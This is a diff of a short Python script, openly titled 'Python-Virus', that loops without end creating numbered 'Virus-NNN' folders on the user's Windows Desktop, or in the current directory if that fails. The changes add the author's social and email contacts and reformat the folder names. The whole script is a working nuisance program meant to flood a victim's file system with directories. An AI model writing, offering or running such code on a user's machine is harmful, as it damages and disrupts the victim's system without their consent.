@@ -1,20 +1,31 @@
 '''Python-Virus
-GitHub: https://github.com/JoaoAssalim/Python-Virus'''
+Instagram: JoaoAssalim_
+Email: assalim.py@gmail.com
+GitHub Repo: https://github.com/JoaoAssalim/Python-Virus'''
 
 import os
-import time
 
-print("Assalim's Virus is Starting...")
-time.sleep(1)
-
-direct = os.getcwd().split('\\')
-
+oldDirectory = os.getcwd()
+direct = oldDirectory.split('\\')
+newDirectory = f'{direct[0]}\\{direct[1]}\\{direct[2]}\\Desktop'
 counter = 0
 
 while True:
     counter += 1
     try:
-        os.mkdir(f'{direct[0]}\\{direct[1]}\\{direct[2]}\\Desktop\\Virus{counter}')
+        os.chdir(newDirectory)
+        if counter < 10:
+            os.mkdir(f'Virus-00{counter}')
+        elif counter < 100:
+            os.mkdir(f'Virus-0{counter}')
+        else:
+            os.mkdir(f'Virus-{counter}')
 
     except:
-        os.mkdir(f'Virus{counter}')
+        os.chdir(oldDirectory)
+        if counter < 10:
+            os.mkdir(f'Virus-00{counter}')
+        elif counter < 100:
+            os.mkdir(f'Virus-0{counter}')
+        else:
+            os.mkdir(f'Virus-{counter}')
